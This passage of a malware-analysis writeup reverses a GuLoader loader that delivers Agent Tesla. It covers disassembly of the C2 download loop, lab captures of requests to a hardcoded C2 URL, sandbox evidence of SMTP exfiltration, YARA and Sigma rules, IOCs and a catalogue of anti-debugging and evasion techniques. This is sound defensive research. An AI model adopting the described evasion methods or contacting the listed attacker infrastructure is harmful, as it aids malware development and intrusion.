05BEC630  push  dword ptr [ebp+0ECh]      ; write cursor
05BEC636  push  dword ptr [ebp+0DCh]      ; InternetReadFile
05BEC63C  call  gl_call_gate
05BEC641  test  eax, eax
05BEC647  jz    0x5BEC713                 ; API failed -> close and bail
05BEC64D  mov   eax, [ebp+0F0h]           ; bytes read
05BEC653  test  eax, eax
05BEC655  jz    0x5BEC713                 ; end of stream -> leave the loop
05BEC65B  add   [ebp+0F4h], eax           ; total += bytes read
05BEC661  jmp   0x5BEC594                 ; loop
```

**Two checks, both structural: the API succeeded, and the stream is not finished.** No magic bytes, no length bound, no checksum on the payload content. And no `HttpQueryInfoA` is resolved anywhere in the dump, which means **the HTTP status code is never inspected**. A 404 and a 200 are treated identically at this stage.

## Dynamic Analysis

Lab: VirtualBox Windows 10 x64, host-only networking, FakeNet-NG 3.5, System Informer, Regshot 1.9.0. Clean snapshot before each run, restored after. The kernel dumper ran in observation mode throughout.

### C2

With FakeNet up, the C2 is in the clear on the first run:

```
10/16/26 02:06:01 PM [Diverter]       guloader.exe (7008) requested TCP 185.29.9.43:80
10/16/26 02:06:01 PM [HTTPListener80] GET /SpQwXyk177.bin HTTP/1.1
                                      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:157.0) Gecko/20100101 Firefox/157.0
                                      Host: 185.29.9.43
                                      Cache-Control: no-cache
```

A **hardcoded IP with no DNS query before the connection**, plain HTTP on port 80, and a spoofed Firefox user agent. The request is made by the GuLoader process itself, before any injection.

![FakeNet capturing the C2 request and retries](/assets/img/guloader/19-fakenet-c2.png)
*Figure 23. The C2 request and the retry rhythm: 10 seconds between requests, then a pause of about two and a half minutes, then another burst. There is no DNS query anywhere in the log.*

FakeNet's default response is not accepted, and the loader retries on a fixed rhythm:

```
14:06:01  GET /SpQwXyk177.bin
14:06:11  GET
14:06:25  GET
14:06:35  connection to 185.29.9.43:80
          ~2m23s pause
14:08:58  GET
14:09:09  GET ...
```

That spacing with periodic backoff is a usable network detection signal on its own.

I did not resolve where exactly the FakeNet file is rejected. The read loop does not check content, so it happens after, in code that was still encrypted in my dump. It is the one loose end I left deliberately: I had already decided to spend my time on the loader rather than the payload.

### Host artifacts

Regshot on a clean snapshot, registry plus `C:\Users`, with FakeNet up. 93 changes recorded, and **not one of them is persistence**:

- `bam\State\UserSettings\...` and the ROT13 `UserAssist` entry: written by Windows to record that the binary ran, not by the sample
- `AppCompatFlags\Compatibility Assistant\Store\...`: same
- `Services\WinDivert1.3`: **FakeNet's own driver**, part of my lab, not the sample
- everything else is Windows noise

No Run key, no scheduled task, no service. This is consistent with GuLoader being a pure in-memory loader: whatever persistence the infection establishes belongs to the payload, after injection.

### The payload I did not get

My lab never received the real payload because the C2 was already dead by the time I was testing. Two options at that point: enable real network access in the VM and capture it, or find a capture from when the C2 was live.

I chose the second, for two reasons. Real network access means the sample reaches the attacker's live infrastructure and Agent Tesla actually exfiltrates data from my VM, which I am not doing. And the loader was always the point of this analysis. The GuLoader engine is the part the reversing community has the least written about; Agent Tesla has been documented to death.

MalwareBazaar's vendor intelligence links an **ANY.RUN task on the same sample** (MD5 `8277F8350E12ECEE116C42ACB4AA48C0`), run on **2026-10-09 14:15**, the day the sample was first seen, while the C2 was still serving.

Verdict: **Agent Tesla**. Network from that run, all from PID 6640:

| Time | Connection | Meaning |
|---|---|---|
| 15091 ms | `185.29.9.43:80`, `GET /` **200 OK** | stage 3 download, the same C2 my lab hit |
| 18104 ms | `208.95.112.1:80`, `ip-api.com` | victim IP and geolocation check |
| 19205 ms | `198.27.80.139:587`, `mail.holzbrenzii.com` | **SMTP submission: exfiltration** |

![ANY.RUN connections](/assets/img/guloader/7-anyrun-connections.png)
*Figure 24. The same C2 IP my lab saw, answering 200 OK, followed by a geolocation lookup and an SMTP submission connection. Port 587 to a mail host is Agent Tesla's standard exfiltration channel.*

Whether `holzbrenzii.com` is attacker-registered or a compromised legitimate mail host, I did not establish.

**And the part that validates the static work.** The process tree shows the sample spawning child copies of **itself**, with the child tagged `agenttesla` doing all three connections. The injection target is a fresh copy of the loader's own image, not a system binary.

![ANY.RUN process tree](/assets/img/guloader/7-anyrun-process-tree.png)
*Figure 25. The loader spawning children of its own image. The one carrying Agent Tesla is the child, not a hollowed system binary, which is exactly what the resolved API set predicted.*

That is exactly what the resolved API set predicted. `CreateProcessInternalW` appears at **two separate sites** in my dump (`0x5BECED9` and `0x5BECF40`), sitting next to `NtCreateSection`, `NtMapViewOfSection` and `NtResumeThread`. I called section-mapping injection into a spawned process from the import set alone, before ever seeing it run, and the independent sandbox run of 9 October shows precisely that.

Two tags on that run, `ultravnc` and `rmm-tool`, I cannot explain. They could be a secondary component or a sandbox heuristic. I am not claiming either.

## Detection

### YARA: anchored on the one thing that cannot be encrypted

The useful question for a sample like this is: **what is the malware forced to expose in order to function?** Encrypt whatever you like, but the code that performs the decryption cannot itself be encrypted while it runs. That is the anchor.

```yara
rule GuLoader_BlockEngine_Memory
{
    meta:
        author      = "0xMastEB"
        description = "GuLoader per-block decrypt/execute/re-encrypt engine, in-memory"
        sample      = "729ef8e6a3cf1859811f3010b514416231e92ca66c4817cf8d6fce9df427a6a8"
        scope       = "memory captured at decrypt time, not the file on disk"

    strings:
        $dec = { 31 10 83 C0 04 39 D8 75 F7 58 E8 ?? ?? ?? ?? FF D0 }
        $enc = { 83 EA 04 31 0A 39 DA 75 F7 }

    condition:
        $dec or $enc
}
```

![The engine bytes the rule is built from](/assets/img/guloader/21-block-engine-bytes.PNG)
*Figure 26. The bytes behind the rule. The only field that moves between builds is the rel32 of the call to the breakpoint check, which is why it is wildcarded.*

A bare xor loop is in half the binaries on a machine and would be useless alone. What is specific here is the **sequence**: decrypt loop, `pop eax`, breakpoint check, `call eax`, which is "decrypt a block and jump straight into it", plus the mirrored loop that re-encrypts the same range.

Testing, because a rule nobody tested is not a rule:

| Target | Result |
|---|---|
| My kernel dump `code_00_05BDC000.bin` | **match**, `$dec` at `0x5C0136C`, `$enc` at `0x5C013A8` |
| `C:\Windows\SysWOW64`, recursive, 2,442 DLLs | **0 hits** |
| Live process by PID, single scan, elevated, during the C2 retry phase | no match |
| Live process by PID, 300 scans at 200 ms intervals | **0 / 300** |

That last row is the honest limitation, and I would rather publish it than hide it. The rule is correct and it is clean, but **a scanner that passes over the live process periodically reads the region without trouble and finds ciphertext**. I confirmed the region is readable: System Informer shows it as `Private: Commit`, 85,084 kB, RWX, fully resident, so this is not a permissions problem and not unreadable pages. It is the cipher doing its job.

Which gives the scope line for the rule: **effective on memory captured at decrypt time (a dumper built for it, or a sandbox that dumps at the right moment), not on periodic user-mode scanning of a live process.** That is also the practical justification for the kernel dumper existing at all.

### Sigma: the part the cipher cannot hide

Since memory detection needs a capture at the right instant, the weight has to go on behaviour. Sysmon has no event for `VirtualAlloc`, so the 83 MB RWX allocation is invisible to it, and the URL and user agent live only in proxy logs. What Sysmon does see is Event 3: which process connected where.

```yaml
title: Installer Process From User Folder Connecting To Bare IP Over HTTP
id: 5b1f3c9e-7a2d-4e8f-9c61-0d4a2e7b8f13
status: experimental
description: >
    Detects a process started from a user-writable folder opening an outbound
    HTTP connection to a bare IP address with no hostname. Observed with GuLoader
    fetching its encrypted payload directly from a hardcoded IP.
author: 0xMastEB
date: 2026-10-19
tags:
    - attack.command-and-control
    - attack.t1105
    - attack.t1071.001
logsource:
    category: network_connection
    product: windows
detection:
    selection:
        Initiated: 'true'
        DestinationPort: 80
        DestinationHostname: ''
        Image|contains:
            - '\Downloads\'
            - '\AppData\'
            - '\Temp\'
    filter_private:
        DestinationIp|cidr:
            - '10.0.0.0/8'
            - '172.16.0.0/12'
            - '192.168.0.0/16'
            - '127.0.0.0/8'
    filter_browsers:
        Image|endswith:
            - '\chrome.exe'
            - '\firefox.exe'
            - '\msedge.exe'
    condition: selection and not 1 of filter_*
falsepositives:
    - Software updaters running from AppData that talk to IP-addressed servers
level: medium
```

The reasoning behind each piece:

`DestinationHostname: ''` is the actual anomaly. GuLoader connects to a hardcoded IP with no DNS query first, which a legitimate installer almost never does. `Image|contains` targets user-writable folders rather than a filename, because the sample's name changes every campaign while the delivery path does not. `filter_private` keeps printers and NAS boxes out. `filter_browsers` is needed because Chrome installs under `AppData` and talks to bare IPs constantly. And `level: medium`, not high, because on its own this will fire on badly written updaters. Its value is as a correlation signal next to a freshly downloaded installer.

Declared limitation: Sysmon fills `DestinationHostname` from a reverse lookup of the IP, so if the C2 address has a PTR record the field is not empty and the rule does not fire. Not yet tested against a Sysmon log from the lab run.

## Indicators of Compromise (IOCs)

Hashes

```
SHA256  729ef8e6a3cf1859811f3010b514416231e92ca66c4817cf8d6fce9df427a6a8  (stage 1, NSIS dropper)
SHA1    03a79e19baad8ace1bcd28e2a20a4fe2aa65ddaa
MD5     8277f8350e12ecee116c42acb4aa48c0
SHA256  ff1cfb14cfe8a63462ae6df6570a56c01d9a9bdcd6f4e647a602928b0463d900  (Cambism, dropped blob)
```

Host artefacts

```
Lure filename   ODEME DEKONTU.exe        (Turkish: "payment receipt")
Directory       %APPDATA%\boligbebyggelsernes\lams\Stregernes\
Dropped blob    Cambism                  (179 KB, no extension, mtime 2025-12-03)
Decoy folders   Bulningerne70\ , Lepomis\
NSIS metadata   product "Quislingism", section "Screenland"
Registry        none written by the sample
Memory          ~83 MB RWX Private region, shellcode at a random offset inside it
Memory          many single-page ER--- regions containing mov eax,<syscall>; mov edx,<ntdll>; call edx
```

Network, stage 2

```
C2 IP         185.29.9.43
Port          80/TCP (HTTP)
URL           hxxp://185.29.9.43/SpQwXyk177.bin
User-Agent    Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:157.0) Gecko/20100101 Firefox/157.0
Header        Cache-Control: no-cache
Buffer        64 KB allocated for the response
Behaviour     requests 10 s apart, ~2.5 min backoff between bursts, repeating
              hardcoded IP, no DNS query
```

Network, stage 3 (Agent Tesla, from the ANY.RUN run of 2026-10-09)

```
IP check      ip-api.com  (208.95.112.1:80)
Exfil SMTP    mail[.]holzbrenzii[.]com  ->  198.27.80.139:587  (OVH, FR)
```

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Defense Evasion | Obfuscated Files or Information | T1027 |
| Defense Evasion | Obfuscated Files or Information: Embedded Payloads | T1027.009 |
| Defense Evasion | Deobfuscate/Decode Files or Information | T1140 |
| Defense Evasion | Process Injection: Process Hollowing | T1055.012 |
| Defense Evasion | Debugger Evasion | T1622 |
| Defense Evasion | Virtualization/Sandbox Evasion: System Checks | T1497.001 |
| Defense Evasion | Virtualization/Sandbox Evasion: Time Based Evasion | T1497.003 |
| Defense Evasion | Indicator Removal (in-memory analogue: pages zeroed after use) | T1070 |
| Defense Evasion | Execution Guardrails | T1480 |
| Execution | Native API | T1106 |
| Discovery | Security Software Discovery | T1518.001 |
| Discovery | System Service Discovery | T1007 |
| Discovery | Application Window Discovery | T1010 |
| Discovery | Software Discovery | T1518 |
| Command and Control | Application Layer Protocol: Web Protocols | T1071.001 |
| Command and Control | Ingress Tool Transfer | T1105 |
| Exfiltration | Exfiltration Over Alternative Protocol (stage 3, SMTP) | T1048 |

## Anti-Analysis Summary

| Technique | Present | Notes |
|---|---|---|
| Per-block cipher | Yes | decrypt, execute, re-encrypt; only one block plaintext at a time |
| Exception-driven control flow | Yes | no jumps between blocks; VEH advances `Eip` by an encrypted delta byte |
| Trap flag abuse | Yes | 214 sites in 92 KB, `0x100` never written as a literal, polymorphic across registers |
| Deliberate `int 3` / `ud2` | Yes | `0x80000003` and `0xC000001D` both in the handler's dispatch table |
| Hardware breakpoint detection | Yes | `Dr0`-`Dr3`, `Dr6`, `Dr7` read from the VEH `CONTEXT`, free, on every exception |
| Software breakpoint detection | Yes | first bytes of every call target checked for `CC`, `CD 03`, `0F 0B` |
| Destructive to software breakpoints | Yes | a `0xCC` inside a block is XORed by the re-encrypt loop and corrupts it |
| Punishment stub | Yes | moves `esp`/`ebp` 256 bytes and `popa` from garbage, so the crash is far from the check |
| ScyllaHide detection | Yes | address-space scan via `NtQueryVirtualMemory`, count compared against `0x4EF3` |
| Decoy execution path | Yes | tampering leads to a benign NSIS installer completing, with no payload |
| Page wiping after use | Yes | one page observed going from entropy 7.51 to 0.00 between two sweeps |
| Direct syscalls via copied trampolines | Yes | dozens of one-page copies, so ntdll/kernel32 hooks are bypassed |
| API resolution by hash | Yes | djb2 + per-character XOR; no imports, no strings |
| Runtime-folded constants | Yes | exception codes, CONTEXT offsets, bounds, keys; no immediates to signature |
| Junk arithmetic | Yes | long add/sub chains that cancel out; also defeats entropy-based dumping |
| Control flow flattening | Yes | the resolver doubles as a dispatcher, `eax` selects the case, first case is `0x539` |
| Memory flooding | Likely | 83 MB RWX for ~156 KB of code; intent inferred, not proven |
| Anti-VM | No | the sample runs fine in VirtualBox with no debugger present |

The shape of this sample is the opposite of most crypters I have looked at. The packing is not especially exotic, it is a plain XOR. **All of the investment went into making the code impossible to observe while it runs**, and into making tampering fail quietly rather than loudly. Against a user-mode debugger it is extremely effective. Against something operating below the level it is watching, it has no answer at all, because every check it has assumes the observer is a process.

## Analysis Environment and Methodology

Static analysis: Detect It Easy for triage, 7-Zip 15.05 for the NSIS script, **IDA Pro** for the dumped shellcode (loaded as a raw 32-bit binary at the dump's base address), and Python for the hash brute force against the Windows export tables.

Dynamic analysis: VirtualBox Windows 10 x64, host-only networking, **FakeNet-NG 3.5** for network containment, **System Informer** for process and memory inspection, **Regshot 1.9.0** for registry and filesystem diffing on a clean snapshot. x32dbg with ScyllaHide was used early and is documented above as a failure, not as a method.

The dumping was done with my own tooling: a kernel driver with shared-page IPC, and a dumper built on top of it that maps the address space by probing, finds the cipher engine by pattern scan at runtime, and sweeps a 2 MB window around it every 30 ms, keeping the highest-scoring version of each page. It does not patch anything. An earlier version did patch the re-encrypt loop, and that patch is what triggered the decoy installer, which I only established by running the same dumper with patching disabled and watching the installer not appear.

A note on the IDA figures: the shellcode ships with no symbols and IDA loads it as an undifferentiated blob. Names like `gl_veh_handler`, `gl_check_debug_regs`, `gl_advance_eip`, `gl_resolve_api`, `gl_block_engine` and `gl_hash` are my own annotations, applied as I identified each function, and the comments on the folded constants are mine too. The figures show the database after the work, not how it looked on load.

Where this writeup says something is **inferred**, I mean it. The purpose of the 83 MB allocation, the role of `BaseThreadInitThunk`, the meaning of the 11 unresolved hashes, the `ultravnc` and `rmm-tool` tags on the sandbox run, and the point at which the FakeNet response is rejected were all left unproven. Everything else was verified either in the disassembly or at runtime.

Two findings came from an independent source rather than my lab, and are labelled as such throughout: the identity of the final payload and its SMTP exfiltration host, both from the ANY.RUN task of 2026-10-09 linked from MalwareBazaar's vendor intelligence. My own run never received the payload because the C2 was dead by then.

Sample obtained from MalwareBazaar (signature GuLoader, first seen 2026-10-09).
